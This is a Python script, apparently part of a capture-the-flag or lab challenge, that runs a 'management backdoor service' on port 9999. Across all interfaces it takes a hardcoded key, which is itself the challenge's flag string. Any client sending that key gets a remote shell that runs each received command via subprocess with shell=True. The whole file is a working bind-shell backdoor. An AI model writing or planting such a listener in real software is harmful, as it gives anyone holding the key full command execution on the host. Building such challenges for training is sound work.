#!/usr/bin/env python3
# Management backdoor service - Port 9999
# For authorized support personnel only

import socket
import threading
import subprocess

class BackdoorService:
    def __init__(self, host='0.0.0.0', port=9999):
        self.host = host
        self.port = port
        self.service_key = "CTF{t3ln3t_tr4v3rs4l_1ot_pwn3d_28}"
        
    def handle_client(self, conn, addr):
        try:
            conn.send(b"Corporate IoT Management Service\n")
            conn.send(b"Enter service key: ")
            
            key = conn.recv(1024).decode().strip()
            if key == self.service_key:
                conn.send(b"Access granted. Management shell active.\n")
                conn.send(b"# ")
                
                while True:
                    cmd = conn.recv(1024).decode().strip()
                    if not cmd or cmd == 'exit':
                        break
                        
                    try:
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                        output = result.stdout + result.stderr
                        if not output:
                            output = "Command executed successfully\n"
                        conn.send(output.encode())
                    except Exception as e:
                        conn.send(f"Error: {str(e)}\n".encode())
                    
                    conn.send(b"# ")
            else:
                conn.send(b"Access denied. Invalid service key.\n")
                
        except Exception as e:
            print(f"Client error: {e}")
        finally:
            conn.close()
            
    def run(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.host, self.port))
        sock.listen(5)
        
        print(f"Backdoor service listening on {self.host}:{self.port}")
        
        while True:
            try:
                conn, addr = sock.accept()
                threading.Thread(target=self.handle_client, args=(conn, addr)).start()
            except Exception as e:
                print(f"Server error: {e}")

if __name__ == "__main__":
    service = BackdoorService()
    service.run()